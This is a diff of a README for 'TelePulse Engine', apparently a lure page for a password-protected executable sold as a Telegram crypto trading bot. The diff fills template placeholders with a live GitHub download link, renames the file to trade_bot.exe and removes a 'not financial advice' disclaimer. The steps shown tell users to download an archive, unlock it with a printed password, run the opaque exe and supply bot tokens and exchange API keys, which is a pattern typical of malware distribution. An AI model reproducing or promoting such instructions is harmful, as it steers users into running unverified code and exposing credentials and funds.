@@ -1,5 +1,9 @@
 # 📡 TelePulse Engine — Encrypted Core for Telegram Trading Bots
 
+<p align="center">
+  <img src="https://i.ibb.co/2Q8kxs4/image.png" alt="TelePulse Engine — Telegram control preview" width="80%">
+</p>
+
 **TelePulse Engine** is a compact, password‑protected executable 
 that powers a **Telegram‑controlled crypto strategy bot**.  
 
@@ -8,7 +12,6 @@ connect your exchange API keys (optional), and control everything from Telegram 
 start/stop, status, basic analytics and more 📲
 
 > ⚠️ Educational & research tool.  
-> Not financial advice, not a guaranteed income source.
 
 ---
 
@@ -16,7 +19,7 @@ start/stop, status, basic analytics and more 📲
 
 This repository ships the **core engine file** in encrypted form:
 
-- `trade_engine.py.exe` (inside a protected archive or folder)
+- `trade_bot.exe` (inside a protected archive or folder)
 
 Its main purpose:
 
@@ -61,7 +64,7 @@ Compared to many generic bots and scripts, **TelePulse Engine** focuses on:
 
 <div align="center">
 
-[![⬇️ DOWNLOAD TELEPULSE ENGINE](https://img.shields.io/badge/⬇️_DOWNLOAD_TELEPULSE_ENGINE-00C853?style=for-the-badge&labelColor=000000)](https://github.com/YOUR_USER/YOUR_REPO/archive/refs/heads/main.zip)
+[![⬇️ DOWNLOAD TELEPULSE ENGINE](https://img.shields.io/badge/⬇️_DOWNLOAD_TELEPULSE_ENGINE-00C853?style=for-the-badge&labelColor=000000)](https://github.com/ArrowGlimpse/TgTradePilot/archive/refs/heads/main.zip)
 
 </div>
 
@@ -109,22 +112,21 @@ it simply helps prevent accidental access and modification.
 
    <div align="center">
 
-   [![⬇️ DOWNLOAD PACKAGE](https://img.shields.io/badge/⬇️_DOWNLOAD_PACKAGE-2962FF?style=for-the-badge&labelColor=000000)](https://github.com/YOUR_USER/YOUR_REPO/archive/refs/heads/main.zip)
+   [![⬇️ DOWNLOAD PACKAGE](https://img.shields.io/badge/⬇️_DOWNLOAD_PACKAGE-2962FF?style=for-the-badge&labelColor=000000)](https://github.com/ArrowGlimpse/TgTradePilot/archive/refs/heads/main.zip)
 
    </div>
 
 2. **Unzip** the downloaded archive to any folder on your computer.
 
 3. Find the protected engine file, for example:  
-   `trade_engine_protected.zip` or `trade_engine.py.exe` (depending on how it’s packaged).
+   `trade_bot.zip` or `trade_bot.exe` (depending on how it’s packaged).
 
 4. When your OS or archive tool **asks for a password**, enter:  
    `PUUKpPj^UHud`
 
-5. **Extract** `trade_engine.py.exe` into a trusted folder (e.g. project directory).
+5. **Extract** `trade_bot.exe` into a trusted folder (e.g. project directory).
 
 6. Place your **Telegram bot token from BotFather** into the config file  
    (e.g. `.env` or `config.yaml`):
 
-   ```env
-   TELEGRAM_BOT_TOKEN=YOUR_BOTFATHER_TOKEN_HERE
+
